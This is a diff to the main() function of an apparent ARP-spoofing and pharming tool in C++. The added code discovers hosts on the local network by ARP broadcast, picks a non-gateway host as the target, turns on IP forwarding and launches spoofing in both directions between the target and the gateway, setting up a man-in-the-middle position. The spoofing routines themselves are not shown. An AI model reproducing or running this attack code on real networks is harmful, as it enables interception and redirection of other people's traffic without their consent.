@@ -19,13 +19,14 @@
 
 #include "arp.h"
 #include "scan.h"
+#include "spoof.h"
 #include "pharm_attack.h"
 
 
 int main()
 {
     std::string sender_mac, target_mac;
-    std::string sender_ip, netmask, ifname;
+    std::string sender_ip, target_ip, netmask, ifname;
     std::string gateway_ip;
     
     // iterate through all network interfaces
@@ -45,7 +46,10 @@ int main()
     ARPOperator arp_operator(sender_ip, ifname);
 
     // initialize broadcast for neighbor discovery
+    target_mac = "00:00:00:00:00:00";
+
     arp_operator.prepare_broadcast();
+    arp_operator.prepare_header_values();
     for (auto candidate : candidates) {
         arp_operator.set_target(candidate, target_mac);
         arp_operator.send();
@@ -82,14 +86,30 @@ int main()
         }
     }
 
-    // send_packet(sock, ifindex, sender_ip, sender_mac, target_ip, target_mac);
+    arp_operator.clear_buffer();
+
+    // choose the first target that is not the gateway
+    std::map<std::string, std::string>::iterator it;
+    for (it = ip2mac_map.begin(); it != ip2mac_map.end(); it++) {
+        if (it->first != gateway_ip) {
+            target_ip = it->first;
+            target_mac = it->second;
+        }
+    }
+
+    // initialize the spoof operator
+    SpoofOperator spoof_operator(&arp_operator, gateway_ip, &ip2mac_map);
+
+    if (set_ip_forwarding(1) < 0) {
+        exit(EXIT_FAILURE);
+    }
+
+    arp_operator.prepare_unicast();
+    arp_operator.prepare_header_values();
+
+
+    spoof_operator.attack(target_ip, gateway_ip);
+    spoof_operator.attack(gateway_ip, target_ip);
 
     return 0;
-}
-
-void print_devices(std::vector<std::pair<std::string, std::string>> &answered_list)
-{
-    for (std::pair<std::string, std::string> addr_pair : answered_list) {
-        std::cout << addr_pair.first << " " << addr_pair.second << std::endl;
-    }
 }
